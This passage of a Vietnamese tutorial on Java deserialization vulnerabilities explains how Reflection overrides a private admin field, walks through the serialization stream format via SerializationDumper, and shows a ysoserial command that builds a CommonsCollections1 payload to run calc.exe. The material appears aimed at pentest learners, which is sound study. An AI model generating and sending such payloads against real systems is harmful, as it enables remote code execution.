<span data-position="30911" data-size="217">Còn về hướng Security thì Java Reflection thì thường dùng để bypass filter/sandbox, ví dụ như khi ta đã có 1 chain có thể dẫn tới RCE nhưng có 1 property private của một class nào đó, lúc này chúng ta sẽ tận dụng API </span><strong data-position="31128" data-size="0"><span data-position="31130" data-size="10">Reflection</span></strong><span data-position="31142" data-size="85"> để set lại lại các giá trị của private properties của class trong quá trình Runtime.</span><br>
<span data-position="31228" data-size="37">Từ khái niệm trên ta có thể lợi dụng </span><strong data-position="31265" data-size="0"><span data-position="31267" data-size="10">Reflection</span></strong><span data-position="31279" data-size="11"> trong lỗi </span><strong data-position="31290" data-size="0"><span data-position="31292" data-size="20">Java Deserialization</span></strong><span data-position="31314" data-size="13"> như thế này:</span></p><ol class="part" data-startline="403" data-endline="406" data-position="31328" data-size="0" style="padding-left: 2em;">
<li class="" data-startline="403" data-endline="403" data-position="31331" data-size="0"><strong data-position="31331" data-size="0"><span data-position="31333" data-size="23">Kích hoạt magic method </span><code data-position="31359" data-size="12">readObject()</code><span data-position="31374" data-size="20"> sử dụng Reflection:</span></strong><span data-position="31396" data-size="75"> attacker dùng Reflection để tiếp cận RCE sink khi object được deserialize.</span></li>
<li class="" data-startline="404" data-endline="404" data-position="31475" data-size="0"><strong data-position="31475" data-size="0"><span data-position="31477" data-size="38">Khai thác class có constructor private</span></strong><span data-position="31518" data-size="127">: Ví dụ payload có thể override trường chứa URL hoặc lệnh (cmd), rồi khi method của object thực thi, code tấn công sẽ được gọi.</span></li>
<li class="" data-startline="405" data-endline="406" data-position="31648" data-size="0"><span data-position="31648" data-size="40">Kết hợp với gadget chain: Các class như </span><code data-position="31691" data-size="13">TemplatesImpl</code><span data-position="31707" data-size="93"> dùng Reflection để load bytecode; attacker lợi dụng deserialization để inject bytecode đó → </span><strong data-position="31800" data-size="0"><span data-position="31802" data-size="3">RCE</span></strong><span data-position="31808" data-size="1">.</span></li>
</ol><p class="part" data-startline="407" data-endline="407" data-position="31810" data-size="0"><span data-position="31810" data-size="92">Để cho mọi người dễ hình dung hơn thì ví dụ chúng ta có đoạn code sau đây là giả định class </span><strong data-position="31902" data-size="0"><span data-position="31904" data-size="4">User</span></strong><span data-position="31910" data-size="18"> của một hệ thống.</span></p><div class="part code-block-wrapper code-block-toolbar-handled" data-startline="408" data-endline="426" data-infoprefix-length="4" data-position="31929"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code class="java hljs"><span class="token comment">// Classe User.java</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> username<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">boolean</span> admin <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>  <span class="token comment">// mặc định người dùng không phải admin</span>

    <span class="token keyword">public</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token class-name">String</span> username<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>username <span class="token operator">=</span> username<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isAdmin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> admin<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> username <span class="token operator">+</span> <span class="token string">" (admin="</span> <span class="token operator">+</span> admin <span class="token operator">+</span> <span class="token string">")"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
      </div><p class="part" data-startline="427" data-endline="427" data-position="32314" data-size="0"><span data-position="32314" data-size="60">thì khi có đoạn code này xong thì chúng ta có tạo tài khoản </span><strong data-position="32374" data-size="0"><span data-position="32376" data-size="4">User</span></strong><span data-position="32382" data-size="34"> bình thường là chỉ cần đoạn code.</span></p><div class="part code-block-wrapper code-block-toolbar-handled" data-startline="428" data-endline="433" data-infoprefix-length="4" data-position="32417"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code class="java hljs"><span class="token comment">// Khi đăng ký tài khoản:</span>
<span class="token class-name">User</span> user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token string">"attacker"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// Không hề có cách set admin = true</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// attacker (admin=false)</span>
</code></pre>
      </div><p class="part" data-startline="434" data-endline="434" data-position="32578" data-size="0"><span data-position="32578" data-size="73">Và lúc này chúng ta ví dụ muốn có thể tạo một acc admin, cụ thể ở đây là </span><strong data-position="32651" data-size="0"><span data-position="32653" data-size="25">User attacker thành admin</span></strong><span data-position="32681" data-size="48">. thì chúng ta phải thay đổi được field private </span><code data-position="32731" data-size="5">admin</code><span data-position="32739" data-size="4"> từ </span><code data-position="32746" data-size="5">false</code><span data-position="32754" data-size="7"> thành </span><code data-position="32764" data-size="4">true</code><span data-position="32771" data-size="19"> bẳng cách sử dụng </span><strong data-position="32790" data-size="0"><span data-position="32792" data-size="14">API REFLECTION</span></strong><span data-position="32809" data-size="32">, bằng cách này chúng ta có thể </span><strong data-position="32840" data-size="0"><span data-position="32842" data-size="8">override</span></strong><span data-position="32852" data-size="35"> giá trị nhạy cảm một cách dễ dàng.</span></p><div class="part code-block-wrapper code-block-toolbar-handled" data-startline="435" data-endline="450" data-infoprefix-length="4" data-position="32888"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code class="java hljs"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReflectionTest</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token class-name">User</span> user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token string">"attacker"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Before: "</span> <span class="token operator">+</span> user<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// attacker (admin=false)</span>

        <span class="token class-name">Field</span> adminField <span class="token operator">=</span> <span class="token class-name">User</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        adminField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// bypass private</span>
        adminField<span class="token punctuation">.</span><span class="token function">setBoolean</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// gán true</span>

        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"After:  "</span> <span class="token operator">+</span> user<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// attacker (admin=true)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
      </div><p class="part" data-startline="452" data-endline="452" data-position="33405" data-size="0"><span data-position="33405" data-size="94">Này là mô phỏng tĩnh cho các bạn dễ hiểu, một chút nữa khi đến phần thực hành, mình sẽ chỉ rõ </span><strong data-position="33499" data-size="0"><span data-position="33501" data-size="10">REFLECTION</span></strong><span data-position="33513" data-size="30"> nằm ở đâu và trong quá trình </span><strong data-position="33543" data-size="0"><span data-position="33545" data-size="8">RUN TIME</span></strong><span data-position="33555" data-size="19"> chúng ta lợi dụng </span><strong data-position="33574" data-size="0"><span data-position="33576" data-size="10">REFLECTION</span></strong><span data-position="33588" data-size="13"> như thế nào.</span></p><p class="part" data-startline="454" data-endline="454" data-position="33603" data-size="0"><span data-position="33603" data-size="11">Tham khảo: </span><a href="https://stackoverflow.com/questions/32716952/set-private-field-value-with-reflection" target="_blank" rel="noopener"><span data-position="33615" data-size="62">Cách dùng setAccessible(true) để truy cập và sửa private field</span></a><span data-position="33765" data-size="2">, </span><a href="https://www.baeldung.com/java-reflection-read-private-field-value" target="_blank" rel="noopener"><span data-position="33767" data-size="68">Reading the Value of ‘private’ Fields from a Different Class in Java</span></a><span data-position="33904" data-size="2">, </span><a href="https://www.geeksforgeeks.org/java/how-to-access-private-field-and-method-using-reflection-in-java/" target="_blank" rel="noopener"><span data-position="33906" data-size="64">How to Access Private Field and Method Using Reflection in Java?</span></a><span data-position="34073" data-size="2">, </span><a href="https://stackoverflow.com/questions/3301635/change-private-static-final-field-using-java-reflection" target="_blank" rel="noopener"><span data-position="34075" data-size="53">Cách bypass private static final field – nâng cao hơn</span></a></p><h3 class="part" data-startline="456" data-endline="456" id="8-SerializationDumper" data-id="8-SerializationDumper"><a class="anchor hidden-xs" href="https://hackmd.io/@nhat015/HktihBmLxl#8-SerializationDumper" title="8-SerializationDumper" data-size="22" data-position="34236" smoothhashscroll=""><span class="octicon octicon-link ph ph-link-simple-horizontal"></span></a><span data-position="34236" data-size="22">8. SerializationDumper</span></h3><p class="part" data-startline="457" data-endline="458" data-position="34259" data-size="0"><span data-position="34259" data-size="84">Bây giờ chúng ta đến với một công cụ tiếp theo cũng không kém phần quan trọng đó là </span><a href="https://github.com/NickstaDB/SerializationDumper" target="_blank" rel="noopener"><strong data-position="34344" data-size="0"><span data-position="34346" data-size="19">SerializationDumper</span></strong></a><span data-position="34419" data-size="62">, với công cụ này, chúng ta không phải nhớ rõ hết cấu tạo của </span><strong data-position="34480" data-size="0"><span data-position="34482" data-size="14">Serialize data</span></strong><span data-position="34498" data-size="77"> ở dạng nhị phân. Đây là công cụ mã nguồn mở chuyên dùng để đọc và phân tích </span><strong data-position="34575" data-size="0"><span data-position="34577" data-size="14">Serialize data</span></strong><span data-position="34594" data-size="1">.</span><br>
<span data-position="34595" data-size="15">Và từ format ở </span><a href="https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html" target="_blank" rel="noopener"><span data-position="34611" data-size="3">đây</span></a><span data-position="34697" data-size="49">, mình suy ra được quy luật dùng tool này để xem </span><strong data-position="34745" data-size="0"><span data-position="34747" data-size="14">Serialize data</span></strong><span data-position="34763" data-size="12"> là như này:</span></p><div class="part code-block-wrapper code-block-toolbar-handled" data-startline="459" data-endline="518" data-infoprefix-length="4" data-position="34776"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code class="yaml hljs"><span class="token key atrule">stream</span><span class="token punctuation">:</span>
    <span class="token key atrule">magic                  // STREAM_MAGIC</span><span class="token punctuation">:</span> định danh dữ liệu Serialization (0xaced)
    <span class="token key atrule">version                // STREAM_VERSION</span><span class="token punctuation">:</span> phiên bản Serialization (thường 0x0005)
    contents               // Chuỗi nội dung<span class="token punctuation">,</span> có thể gồm nhiều content liên tiếp

<span class="token key atrule">contents</span><span class="token punctuation">:</span>
    content
    contents content       // Một stream có thể chứa nhiều content

<span class="token key atrule">content</span><span class="token punctuation">:</span>
    object                 // Một đối tượng Java
    blockdata              // Dữ liệu thô (không phải object Java)

<span class="token key atrule">object</span><span class="token punctuation">:</span>
    <span class="token key atrule">newObject              // TC_OBJECT</span><span class="token punctuation">:</span> tạo object mới<span class="token punctuation">,</span> gồm classDesc + field values
    <span class="token key atrule">newClass               // TC_CLASS</span><span class="token punctuation">:</span> mô tả class (không kèm dữ liệu)
    <span class="token key atrule">newArray               // TC_ARRAY</span><span class="token punctuation">:</span> mảng các phần tử
    <span class="token key atrule">newString              // TC_STRING hoặc TC_LONGSTRING</span><span class="token punctuation">:</span> chuỗi mới
    <span class="token key atrule">newEnum                // TC_ENUM</span><span class="token punctuation">:</span> đối tượng Enum
    <span class="token key atrule">newClassDesc           // TC_CLASSDESC</span><span class="token punctuation">:</span> mô tả đầy đủ class (tên<span class="token punctuation">,</span> UID<span class="token punctuation">,</span> fields<span class="token punctuation">,</span> flags)
    <span class="token key atrule">prevObject             // TC_REFERENCE</span><span class="token punctuation">:</span> tham chiếu đến object đã xuất hiện
    <span class="token key atrule">nullReference          // TC_NULL</span><span class="token punctuation">:</span> giá trị null
    <span class="token key atrule">exception              // TC_EXCEPTION</span><span class="token punctuation">:</span> object exception
    TC_RESET               // Reset bảng tham chiếu (reference table)

<span class="token key atrule">blockdata</span><span class="token punctuation">:</span>
    <span class="token key atrule">blockdatashort         // TC_BLOCKDATA</span><span class="token punctuation">:</span> block dữ liệu ngắn
    <span class="token key atrule">blockdatalong          // TC_BLOCKDATALONG</span><span class="token punctuation">:</span> block dữ liệu dài

<span class="token key atrule">blockdatashort</span><span class="token punctuation">:</span>
    TC_BLOCKDATA (unsigned byte) &lt;size<span class="token punctuation">&gt;</span> (byte)<span class="token punctuation">[</span>size<span class="token punctuation">]</span>
    // size 1 byte<span class="token punctuation">,</span> theo sau là payload bytes

<span class="token key atrule">blockdatalong</span><span class="token punctuation">:</span>
    TC_BLOCKDATALONG (int32 size) (byte)<span class="token punctuation">[</span>size<span class="token punctuation">]</span>
    // size 4 byte<span class="token punctuation">,</span> dùng cho block lớn

<span class="token key atrule">newString</span><span class="token punctuation">:</span>
    TC_STRING newHandle (utf)          // Chuỗi UTF<span class="token punctuation">-</span>8 ngắn
    TC_LONGSTRING newHandle (long<span class="token punctuation">-</span>utf) // Chuỗi UTF<span class="token punctuation">-</span>8 dài

<span class="token key atrule">newClassDesc</span><span class="token punctuation">:</span>
    TC_CLASSDESC
        <span class="token key atrule">className (utf)                // Tên class (ví dụ</span><span class="token punctuation">:</span> "User")
        serialVersionUID (long)        // UID kiểm tra tính tương thích class
        <span class="token key atrule">classDescFlags (byte)          // Cờ</span><span class="token punctuation">:</span> SC_SERIALIZABLE<span class="token punctuation">,</span> SC_EXTERNALIZABLE<span class="token punctuation">,</span> v.v.
        fieldCount (short)             // Số lượng field
        fields<span class="token punctuation">[</span><span class="token punctuation">]</span>                       // Danh sách field
        classAnnotations               // Có thể chứa blockdata bổ sung
        superClassDesc                 // Tham chiếu superclass hoặc TC_NULL

<span class="token key atrule">field</span><span class="token punctuation">:</span>
    <span class="token key atrule">fieldTypeCode (byte)               // Ví dụ</span><span class="token punctuation">:</span> 'I' (int)<span class="token punctuation">,</span> 'L' (object)<span class="token punctuation">,</span> 'Z' (boolean)
    fieldName (utf)                    // Tên field
    className (utf<span class="token punctuation">,</span> nếu object)        // Descriptor kiểu<span class="token punctuation">,</span> <span class="token key atrule">ví dụ</span><span class="token punctuation">:</span> <span class="token string">"Ljava/lang/String;"</span>

<span class="token key atrule">values</span><span class="token punctuation">:</span>
    fieldValue<span class="token punctuation">[</span><span class="token punctuation">]</span>                       // Chuỗi byte biểu diễn giá trị thực tế
</code></pre>
      </div><p class="part" data-startline="519" data-endline="519" data-position="37303" data-size="0"><span data-position="37303" data-size="70">Thì để giải thích kĩ hơn thì tool này giúp chúng ta dễ dàng nhìn thấy:</span></p><blockquote class="part" data-startline="520" data-endline="539" style="border-left-color: rgb(30, 144, 255);">
<p data-position="37376" data-size="0"><span class="color" data-color="#1e90ff" data-position="0" data-size="15"></span><span data-position="37391" data-size="27">STREAM_MAGIC &amp; STREAM_VERSION</span></p>
<ul data-position="37423" data-size="0">
<li class="" data-startline="521" data-endline="521" data-position="37425" data-size="0"><span data-position="37427" data-size="51">Dấu hiệu nhận biết traffic chứa Java Serialization.</span></li>
<li class="" data-startline="522" data-endline="523" data-position="37480" data-size="0"><span data-position="37483" data-size="91">Khi bật Burp → nếu thấy aced0005 trong request body → gần như chắc chắn là serialized data.</span></li>
</ul>
<p data-position="37575" data-size="0"><span data-position="37576" data-size="29">newClassDesc + field (Source)</span></p>
<ul data-position="37606" data-size="0">
<li class="" data-startline="525" data-endline="525" data-position="37608" data-size="0"><span data-position="37610" data-size="41">Cho biết class nào đang được deserialize.</span></li>
<li class="" data-startline="526" data-endline="527" data-position="37653" data-size="0"><span data-position="37656" data-size="82">Kiểm tra serialVersionUID khớp → nếu có gadget chain tương ứng thì có thể exploit.</span></li>
</ul>
<p data-position="37739" data-size="0"><span data-position="37740" data-size="16">blockdata (Sink)</span></p>
<ul data-position="37757" data-size="0">
<li class="" data-startline="529" data-endline="530" data-position="37759" data-size="0"><span data-position="37761" data-size="84">Chứa dữ liệu mà attacker có thể kiểm soát → có thể dẫn tới RCE nếu qua gadget chain.</span></li>
</ul>
<p data-position="37847" data-size="0"><span data-position="37848" data-size="11">TC_REFERENCE</span></p>
<ul data-position="37861" data-size="0">
<li class="" data-startline="532" data-endline="533" data-position="37863" data-size="0"><span data-position="37865" data-size="72">Cho thấy object được tái sử dụng → quan trọng để hiểu flow gadget chain.</span></li>
</ul>
<p data-position="37939" data-size="0"><span data-position="37940" data-size="14">classDescFlags</span></p>
<ul data-position="37955" data-size="0">
<li class="" data-startline="535" data-endline="536" data-position="37957" data-size="0"><span data-position="37959" data-size="76">Nếu class hỗ trợ Serializable hoặc Externalizable, khả năng exploit cao hơn.</span></li>
</ul>
<p data-position="38037" data-size="0"><span data-position="38038" data-size="6">values</span></p>
<ul data-position="38045" data-size="0">
<li class="" data-startline="538" data-endline="538" data-position="38047" data-size="0"><span data-position="38049" data-size="64">Phần cuối cùng chứa dữ liệu thực tế → ví dụ số 20 → 00 00 00 14.</span></li>
<li class="" data-startline="539" data-endline="539" data-position="38115" data-size="0"><span data-position="38118" data-size="47">Với chuỗi → TC_STRING → bạn có thể nhét payload.</span></li>
</ul>
</blockquote><p class="part" data-startline="541" data-endline="541" data-position="38165" data-size="0"><span data-position="38165" data-size="128">Khi chúng ta xài tool này, ta có thể dễ dàng xác định được các class và field được nạp để dễ dàng kiểm soát và xây dựng payload.</span></p><h3 class="part" data-startline="543" data-endline="543" id="9-Giới-thiệu-về-Ysoserial" data-id="9-Giới-thiệu-về-Ysoserial"><a class="anchor hidden-xs" href="https://hackmd.io/@nhat015/HktihBmLxl#9-Gi%E1%BB%9Bi-thi%E1%BB%87u-v%E1%BB%81-Ysoserial" title="9-Giới-thiệu-về-Ysoserial" data-size="26" data-position="38299" smoothhashscroll=""><span class="octicon octicon-link ph ph-link-simple-horizontal"></span></a><span data-position="38299" data-size="26">9. Giới thiệu về Ysoserial</span></h3><p class="part" data-startline="544" data-endline="545" data-position="38326" data-size="0"><span data-position="38326" data-size="27">Chúng ta đang nhắc đến lỗi </span><strong data-position="38353" data-size="0"><span data-position="38355" data-size="34">Java Deserialization vulnerability</span></strong><span data-position="38391" data-size="19"> mà không nhắc đến </span><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener"><strong data-position="38411" data-size="0"><span data-position="38413" data-size="9">Ysoserial</span></strong></a><span data-position="38463" data-size="132"> là một sự thiếu sót rất lớn. Đây là công cụ mã nguồn mở cực kỳ phổ biến, được sử dụng để tạo ra các payload khai thác dựa trên các </span><strong data-position="38595" data-size="0"><span data-position="38597" data-size="12">gadget chain</span></strong><span data-position="38611" data-size="32"> có sẵn trong các thư viện Java.</span><br>
<span data-position="38644" data-size="41">Cách hoạt động của tool này rất đơn giản:</span></p><ul class="part" data-startline="546" data-endline="549" data-position="38686" data-size="0">
<li class="" data-startline="546" data-endline="546" data-position="38688" data-size="0"><span data-position="38688" data-size="47">Pentester chỉ định loại gadget chain muốn dùng.</span></li>
<li class="" data-startline="547" data-endline="547" data-position="38738" data-size="0"><span data-position="38738" data-size="31">YSoSerial sẽ sinh ra một chuỗi </span><strong data-position="38769" data-size="0"><span data-position="38771" data-size="22">byte serialized hợp lệ</span></strong><span data-position="38796" data-size="1">.</span></li>
<li class="" data-startline="548" data-endline="549" data-position="38799" data-size="0"><span data-position="38799" data-size="126">Payload này, khi đưa vào ứng dụng có lỗ hổng deserialization, sẽ được JVM nạp và chạy theo gadget chain → dẫn đến hậu quả như </span><strong data-position="38925" data-size="0"><span data-position="38927" data-size="40">RCE, File Write, hoặc Logic Manipulation</span></strong><span data-position="38970" data-size="1">.</span></li>
</ul><p class="part" data-startline="550" data-endline="550" data-position="38972" data-size="0"><span data-position="38972" data-size="6">ví dụ:</span></p><div class="part code-block-wrapper code-block-toolbar-handled" data-startline="551" data-endline="553" data-infoprefix-length="4" data-position="38979"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code class="code hljs">java <span class="hljs-operator">-</span>jar ysoserial.jar CommonsCollections1 <span class="hljs-string">"calc.exe"</span> <span class="hljs-operator">&gt;</span> payload.ser
</code></pre>
      </div><ul class="part" data-startline="554" data-endline="557" data-position="39060" data-size="0">
<li class="" data-startline="554" data-endline="554" data-position="39062" data-size="0"><span data-position="39062" data-size="36">CommonsCollections1 là gadget chain.</span></li>
<li class="" data-startline="555" data-endline="555" data-position="39101" data-size="0"><span data-position="39101" data-size="32">"calc.exe" là lệnh cần thực thi.</span></li>
<li class="" data-startline="556" data-endline="557" data-position="39136" data-size="0"><span data-position="39136" data-size="47">payload.ser là file serialized payload sinh ra.</span></li>
</ul><p class="part" data-startline="558" data-endline="558" data-position="39185" data-size="0"><span data-position="39185" data-size="45">Với bộ tool này, chúng ta đỡ phải đi tìm các </span><strong data-position="39230" data-size="0"><span data-position="39232" data-size="11">gatgetchain</span></strong><span data-position="39245" data-size="74"> một cách thủ công mà chỉ cần xác định thư viện và phiên bản của hệ thống.</span></p><h3 class="part" data-startline="560" data-endline="560" id="10-Công-cụ-Gadget-Inspector" data-id="10-Công-cụ-Gadget-Inspector"><a class="anchor hidden-xs" href="https://hackmd.io/@nhat015/HktihBmLxl#10-C%C3%B4ng-c%E1%BB%A5-Gadget-Inspector" title="10-Công-cụ-Gadget-Inspector" data-size="28" data-position="39325" smoothhashscroll=""><span class="octicon octicon-link ph ph-link-simple-horizontal"></span></a><span data-position="39325" data-size="28">10. Công cụ Gadget Inspector</span></h3><p class="part" data-startline="561" data-endline="561" data-position="39354" data-size="0"><span data-position="39354" data-size="65">Trên thực tế, các ứng dụng thường có quy mô rất lớn, đặt biệt là </span><strong data-position="39419" data-size="0"><span data-position="39421" data-size="19">ứng dụng enterprise</span></strong><span data-position="39443" data-size="56">, thì khi có code ở quy mô đồ sộ như này, thì việc kiếm </span><strong data-position="39498" data-size="0"><span data-position="39500" data-size="11">gadgetchain</span></strong><span data-position="39513" data-size="56"> thủ công khá là khó khăn, lúc này chúng ta sẽ dùng đến </span><a href="https://github.com/JackOfMostTrades/gadgetinspector" target="_blank" rel="noopener"><strong data-position="39570" data-size="0"><span data-position="39572" data-size="24">công cụ Gadget Inspector</span></strong></a><span data-position="39653" data-size="24">. Mặc dù chúng ta đã có </span><strong data-position="39676" data-size="0"><span data-position="39678" 